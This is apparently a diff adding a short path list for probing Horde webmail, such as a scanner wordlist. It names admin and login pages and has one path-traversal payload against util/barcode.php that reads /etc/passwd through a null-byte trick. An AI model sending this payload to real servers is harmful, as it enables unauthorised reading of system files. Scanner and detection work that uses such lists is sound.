@@ -1,0 +1,7 @@
+/horde/admin/user.php
+/admin/user.php
+/horde/login.php
+/login.php
+/horde/imp/login.php
+/imp/login.php
+/horde/util/barcode.php?type=../../../../../../../../../../../etc/./passwd%00
